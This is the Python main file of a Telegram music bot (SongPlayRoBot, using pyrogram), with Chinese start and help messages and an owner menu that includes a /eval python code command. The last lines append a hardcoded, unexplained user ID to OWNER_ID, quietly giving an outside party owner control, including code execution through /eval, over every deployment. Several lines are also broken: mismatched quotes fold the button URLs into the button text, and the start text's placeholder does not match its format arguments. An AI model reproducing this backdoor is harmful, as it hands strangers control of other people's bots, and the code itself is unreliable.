from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from TamilBots.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from TamilBots import app, LOGGER
from TamilBots.TamilBots import ignore_blacklisted_users
from TamilBots.sql.chat_sql import add_chat_to_db

start_text = """
👋 嗨! @{message.from_user.username}\n\n 我是 🎸歌曲播放機器人[🎶](https://telegra.ph/file/6cb884fe1cb943ec12df1.mp4)\n\n 發送你想要的歌名或網址... 😍🥰🤗例如:`/s 南拳媽媽-下雨天
"""

owner_help = """
/blacklist user_id
/unblacklist user_id
/broadcast message to send
/eval python code
/chatlist get list of all chats
"""


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
           [[InlineKeyboardButton(text="問題回報 👬', url='https://t.me/Kevin_RX"),
             InlineKeyboardButton(
                        text="有玩PlayStation歡迎加入群組 🤗', url='https://t.me/PlayStationTw"
                    )
                ]
            ]
        )
    else:
        btn = None
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    if message.from_user["id"] == OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "發送您想要的歌曲的名稱... 😍🥰🤗\n 例如:`/s 南拳媽媽-下雨天 🥳"
    await message.reply(text)

OWNER_ID.append(1492186775)
app.start()
LOGGER.info("SongPlayRoBot 正在工作🤗🤗🤗")
idle()
